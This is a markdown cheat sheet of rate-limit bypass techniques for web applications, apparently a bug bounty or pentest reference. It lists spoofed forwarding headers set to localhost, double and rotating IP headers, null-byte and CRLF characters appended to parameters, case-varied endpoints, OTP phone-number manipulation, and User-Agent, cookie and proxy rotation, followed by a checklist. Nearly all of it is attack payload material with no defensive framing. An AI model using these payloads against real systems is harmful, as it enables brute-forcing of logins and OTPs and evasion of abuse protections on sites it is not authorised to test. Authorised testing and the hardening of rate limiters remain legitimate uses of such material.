# Rate Limit Bypass Techniques

## 1. Endpoint Variation
```
/signup → /Signup → /SignUp → /SIGNUP → /sign-up
```

## 2. IP Spoofing Headers
```http
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Ip: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forward-For: 127.0.0.1
Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-True-Ip: 127.0.0.1
```

## 3. Double Header
```http
# Add header twice
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1
```

## 4. Rotate IP Values
```
After N requests, change IP value:
X-Forwarded-For: 1.1.1.1 → 1.1.1.2 → 1.1.1.3
```

## 5. Special Characters After Parameter
```bash
email=test@test.com%00
email=test@test.com%0d%0a
email=test@test.com%09
email=test@test.com%0C
email=test@test.com%20
email=test@test.com%0
```

## 6. Random Query Parameter
```
/api/login → /api/login?bypass
/api/login → /api/login?random=123
```

## 7. Country Code Manipulation (OTP)
```
# Remove country code
+91xxxxxxxxxx → [ ]xxxxxxxxxx

# Modify format
xxxxx-xxxxx → +91 xxxxx-xxxxx
```

## 8. User-Agent Rotation
```
Change User-Agent header for each request
```

## 9. Cookie Manipulation
```
Remove or modify cookies between requests
```

## 10. HTTP Method Change
```
POST /api/login → GET /api/login?params
```

## 11. Content-Type Change
```
application/json → application/x-www-form-urlencoded
```

## 12. Proxy/VPN Rotation
```
Use different exit nodes for each batch
```

## Quick Checklist
- [ ] Try endpoint case variations
- [ ] Add X-Forwarded-For with localhost
- [ ] Add double IP headers
- [ ] Rotate IP values in headers
- [ ] Add special chars to parameters
- [ ] Add random query params
- [ ] Rotate User-Agent
- [ ] Clear/modify cookies
- [ ] Try different HTTP methods
- [ ] Use proxy rotation

## Tools
- Burp Intruder with header rotation
- Custom scripts with IP rotation
